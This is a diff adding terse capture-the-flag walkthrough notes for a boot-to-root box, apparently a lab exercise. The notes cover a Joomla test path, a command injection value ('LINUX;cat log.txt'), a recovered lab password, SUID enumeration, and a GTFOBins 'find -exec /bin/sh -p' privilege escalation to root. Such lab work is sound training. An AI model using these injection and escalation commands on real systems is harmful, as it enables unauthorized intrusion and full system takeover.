@@ -159,4 +159,52 @@ Finished
 ==============================
 
 
+changed wordlist
+->
+found _test
+->
+IP/joomla/_test
+->
+https://www.exploit-db.com/exploits/47204
+->
+LINUX;cat log.txt
+->
+The interesting file name in the folder?   log.txt 
+->
+basterd : superduperp@$$
+
+
+
+
+
+find / -perm /4000 2>/dev/null
+->
+/usr/bin/find
+-> 
+https://gtfobins.github.io/gtfobins/find/#suid
+find . -exec /bin/sh -p \; -quit
+->
+cat /home/stoner/.secret
+user.txt
+->
+What did you exploit to get the privileged user?
+find
+->
+cd /root
+cat root.txt
+It wasn't that hard, was it?
+
+
+
+->
+Where was the other users pass stored(no extension, just the name)?
+cat /home/basterd/backup.sh
+
+
+
+
+
+
+
+
 
